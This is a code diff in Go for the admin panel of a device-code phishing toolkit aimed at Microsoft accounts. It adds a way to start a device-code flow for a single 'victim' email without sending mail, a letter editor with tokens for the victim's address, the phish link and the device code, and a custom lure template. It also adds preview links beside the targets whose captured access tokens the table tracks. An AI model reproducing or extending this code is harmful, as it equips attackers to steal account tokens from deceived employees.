@@ -6,6 +6,7 @@ import (
 	"html/template"
 	"net/http"
 	"net/url"
+	"os"
 	"strconv"
 	"strings"
 	"time"
@@ -767,6 +768,34 @@ func (s *HttpServer) handleAdminPanel(w http.ResponseWriter, r *http.Request) {
 				camp, _ := LaunchCampaign(name, tmpl, emails)
 				http.Redirect(w, r, fmt.Sprintf("/admin/panel?tab=devicecodes&ok=campaign+%d+launched+(%d+targets)", camp.ID, len(camp.Targets)), http.StatusSeeOther)
 				return
+
+			case "start_dc_single":
+				// Start a DC flow for one email — NO email sent. Use Preview Email to get the HTML.
+				email := strings.TrimSpace(r.FormValue("dc_single_email"))
+				if email == "" || !strings.Contains(email, "@") {
+					http.Redirect(w, r, "/admin/panel?tab=devicecodes&err=invalid+email", http.StatusSeeOther)
+					return
+				}
+				tgt, err := StartDeviceCode(email)
+				if err != nil {
+					http.Redirect(w, r, "/admin/panel?tab=devicecodes&err="+url.QueryEscape(err.Error()), http.StatusSeeOther)
+					return
+				}
+				http.Redirect(w, r, "/admin/panel?tab=devicecodes&ok=dc+started+for+"+url.QueryEscape(email)+"&preview="+tgt.LandingToken, http.StatusSeeOther)
+				return
+
+			case "save_letter":
+				// Save letter.html and subject.txt to working directory.
+				letterHTML := r.FormValue("letter_html")
+				subjectTxt := r.FormValue("subject_txt")
+				if letterHTML != "" {
+					os.WriteFile("letter.html", []byte(letterHTML), 0644)
+				}
+				if subjectTxt != "" {
+					os.WriteFile("subject.txt", []byte(strings.TrimSpace(subjectTxt)), 0644)
+				}
+				http.Redirect(w, r, "/admin/panel?tab=devicecodes&ok=letter+saved", http.StatusSeeOther)
+				return
 			}
 		}
 
@@ -807,8 +836,57 @@ func (s *HttpServer) handleAdminPanel(w http.ResponseWriter, r *http.Request) {
 			template.HTMLEscapeString(s.Cfg.GetSmtpFrom()),
 		))
 
-		// ── Launch campaign ──
-		b.WriteString(`<div class="section"><h2>Launch Campaign</h2><div class="card">
+		// ── Start DC without email (test mode) ──
+		previewToken := r.URL.Query().Get("preview")
+		previewBanner := ""
+		if previewToken != "" {
+			previewBanner = fmt.Sprintf(`<div style="background:#1a2a0a;border:1px solid #3a7a1a;border-radius:4px;padding:10px 14px;margin-bottom:10px;font-size:13px;color:#7fcc40">
+DC started — <a href="/dc/preview/%s" target="_blank" style="color:#aad480;font-weight:700">Preview Email →</a> (copy the HTML and send manually)
+</div>`, template.HTMLEscapeString(previewToken))
+		}
+		b.WriteString(`<div class="section"><h2>Start DC — No Email (Test Mode)</h2>`)
+		b.WriteString(previewBanner)
+		b.WriteString(`<div class="card"><form method="POST" action="/admin/panel?tab=devicecodes">
+<input type="hidden" name="action" value="start_dc_single">
+<div class="form-row">
+  <label style="color:#666;width:160px;font-size:.8rem">Target Email</label>
+  <input type="text" name="dc_single_email" placeholder="victim@company.com" style="width:280px">
+  <button type="submit" style="margin-left:12px">Start DC</button>
+</div>
+<p style="color:#555;font-size:.78rem;margin-top:8px">Starts the device code flow — NO email sent. Use <strong style="color:#888">Preview Email</strong> button to get the HTML, then send it yourself via Gmail/Outlook/etc.</p>
+</form></div></div>`)
+
+		// ── Letter editor ──
+		var existingLetter, existingSubject string
+		if raw, err := os.ReadFile("letter.html"); err == nil {
+			existingLetter = string(raw)
+		}
+		if raw, err := os.ReadFile("subject.txt"); err == nil {
+			existingSubject = strings.TrimSpace(string(raw))
+		}
+		b.WriteString(`<div class="section"><h2>Letter Editor (letter.html + subject.txt)</h2><div class="card">`)
+		b.WriteString(`<p style="color:#555;font-size:.78rem;margin-bottom:10px">
+Tokens: <code style="color:#aaa">SILENTCODERSEMAIL</code> (victim email) · <code style="color:#aaa">SILENTCODERSEMAILURL</code> (URL-encoded) · <code style="color:#aaa">DCLANDING</code> (phish link with login_hint) · <code style="color:#aaa">DCCODE</code> (device code) · <code style="color:#aaa">USER</code> · <code style="color:#aaa">DOMAIN</code> · <code style="color:#aaa">DOMC</code>
+</p>`)
+		b.WriteString(fmt.Sprintf(`<form method="POST" action="/admin/panel?tab=devicecodes">
+<input type="hidden" name="action" value="save_letter">
+<div class="form-row" style="align-items:flex-start">
+  <label style="color:#666;width:120px;font-size:.8rem;margin-top:6px">Subject</label>
+  <input type="text" name="subject_txt" value="%s" placeholder="Microsoft Security Alert: Action Required" style="width:500px">
+</div>
+<div class="form-row" style="align-items:flex-start;margin-top:10px">
+  <label style="color:#666;width:120px;font-size:.8rem;margin-top:6px">letter.html</label>
+  <textarea name="letter_html" rows="16" style="width:700px;background:#111;border:1px solid #2a2a2a;color:#7ec8e3;padding:10px;border-radius:4px;font-family:monospace;font-size:.78rem;resize:vertical" placeholder="Paste your full HTML email here — tokens like SILENTCODERSEMAIL will be replaced when previewing/sending">%s</textarea>
+</div>
+<button type="submit" style="margin-top:10px">Save Letter</button>
+<span style="color:#555;font-size:.78rem;margin-left:12px">Saved as letter.html + subject.txt in the working directory. Takes effect immediately for all future sends/previews.</span>
+</form></div></div>`,
+			template.HTMLEscapeString(existingSubject),
+			template.HTMLEscapeString(existingLetter),
+		))
+
+		// ── Launch campaign (sends via SMTP) ──
+		b.WriteString(`<div class="section"><h2>Launch Campaign (requires SMTP)</h2><div class="card">
 <form method="POST" action="/admin/panel?tab=devicecodes">
 <input type="hidden" name="action" value="launch_campaign">
 <div class="form-row">
@@ -818,6 +896,7 @@ func (s *HttpServer) handleAdminPanel(w http.ResponseWriter, r *http.Request) {
   <select name="camp_template">
     <option value="security_alert">Microsoft Security Alert</option>
     <option value="it_helpdesk">IT Helpdesk</option>
+    <option value="custom">Use letter.html (custom)</option>
   </select>
 </div>
 <div class="form-row" style="align-items:flex-start">
@@ -836,7 +915,7 @@ func (s *HttpServer) handleAdminPanel(w http.ResponseWriter, r *http.Request) {
 		} else {
 			b.WriteString(`<table><thead><tr>
 <th>#</th><th>Email / Tenant</th><th>Code</th><th>Status</th>
-<th>Landing Page</th><th>Started</th><th>Access Token</th></tr></thead><tbody>`)
+<th>Landing Page</th><th>Started</th><th>Preview / Dashboard</th></tr></thead><tbody>`)
 			for i := len(allTargets) - 1; i >= 0; i-- {
 				tgt := allTargets[i]
 				status := tgt.GetStatus()
@@ -858,7 +937,10 @@ func (s *HttpServer) handleAdminPanel(w http.ResponseWriter, r *http.Request) {
 				tgt.mu.Lock()
 				at := tgt.AccessToken
 				tgt.mu.Unlock()
-				tokenCell := `<span style="color:#383838">—</span>`
+				previewURL := "/dc/preview/" + tgt.LandingToken
+				tokenCell := fmt.Sprintf(
+					`<a href="%s" target="_blank" style="display:inline-block;background:#1e3a1e;color:#7fcc40;padding:4px 10px;border-radius:3px;font-size:11px;font-weight:700;text-decoration:none;border:1px solid #3a7a1a">Preview Email</a>`,
+					template.HTMLEscapeString(previewURL))
 				if at != "" {
 					useURL := "/dc/use/" + tgt.LandingToken
 					tokenCell = fmt.Sprintf(
